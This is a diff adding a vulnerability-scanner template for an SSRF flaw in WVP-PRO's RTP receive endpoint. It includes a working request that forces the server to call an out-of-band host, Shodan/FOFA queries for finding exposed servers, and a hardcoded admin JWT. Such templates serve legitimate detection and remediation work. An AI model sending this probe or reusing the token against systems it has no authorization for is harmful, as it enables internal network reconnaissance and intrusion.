@@ -1,0 +1,54 @@
+id: wvp-28181-receive-open-ssrf
+
+info:
+  name: WVP GB28181 RTP Receive Open Callback SSRF
+  author: qwtd
+  severity: high
+  description: |
+    An SSRF (Server-Side Request Forgery) vulnerability exists in the
+    `/api/rtp/receive/open` endpoint of WVP-PRO / WVP-GB28181.
+    The `callBack` parameter is not properly validated, allowing an
+    attacker to force the server to initiate arbitrary outbound HTTP
+    requests to attacker-controlled or internal network resources.
+  impact: |
+    Successful exploitation may allow attackers to:
+      - Perform internal network reconnaissance.
+      - Access internal services not exposed to the Internet.
+      - Interact with cloud metadata services.
+      - Bypass network access controls.
+      - Facilitate further attacks against internal infrastructure.
+  remediation: |
+    Validate and restrict callback URLs using an allowlist.
+    Disallow access to internal IP ranges, localhost addresses,
+    link-local addresses, and cloud metadata endpoints.
+    Implement proper URL parsing and SSRF protections.
+  reference:
+    - https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/e13a3c4d7ba536723f44894f7871c4952111fb0d/2026/05/wvp%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0ssrf%E6%BC%8F%E6%B4%9E/wvp%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5.md?plain=1#L31
+    - https://github.com/648540858/wvp-GB28181-pro/issues
+  classification:
+    cwe-id: CWE-918
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+  metadata:
+    vendor: WVP
+    product: GB28181
+    shodan-query: http.title:"WVP"
+    fofa-query: title="WVP"
+  tags: WVP视频平台
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/rtp/receive/open?callId=12345&stream=ceshi&tcpMode=0&callBack=http://{{interactsh-url}}"
+    headers:
+      access-token: eyJhbGciOiJSUzI1NiIsImtpZCI6IjNlNzk2NDZjNGRiYzQwODM4M2E5ZWVkMDlmMmI4NWFlIn0.eyJqdGkiOiJPbkFSREM4NEc2OWlxZG9rLVpjOE9BIiwiaWF0IjoxNzc5MjQ0NDY3LCJleHAiOjE3ODE4MzY0NjcsIm5iZiI6MTc3OTI0NDQ2Nywic3ViIjoibG9naW4iLCJhdWQiOiJBdWRpZW5jZSIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjIxMjMyZjI5N2E1N2E1YTc0Mzg5NGEwZTRhODAxZmMzIiwicm9sZUlkIjoxfQ.RMEUIp0cpIaX3JzL61YDCUUokEz2ze_YFZqvMp5yvDq0O6Rj0ZULxMGoSu2DYjaZ1WFwX-mA22qsSs48EZ0ZdiE_3I9qRVzwRP8ofndMM4RL0c_XB2KWeAKcam-US9dOtCNfNymiDNHdZ89HAJLdKGoRx44G0pFZtmrrLVWcr2jH905Z_cyVWJY_Qjf4OGpovv3qzpv88jdtPzkTcA0siIDJENE1O352GZJV3PWS73ewXuJFv2MW4BTiVumTQM3aqRwM1KeJTseRtyE9nVTghf0ZgxrbdbG1CSGV8ELdnO9ZuDOezRvIrS8FL33IyQ6ZR8cZ0vaS56jGm2LZ-1WvkA
+      Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: status
+        status:
+          - 200
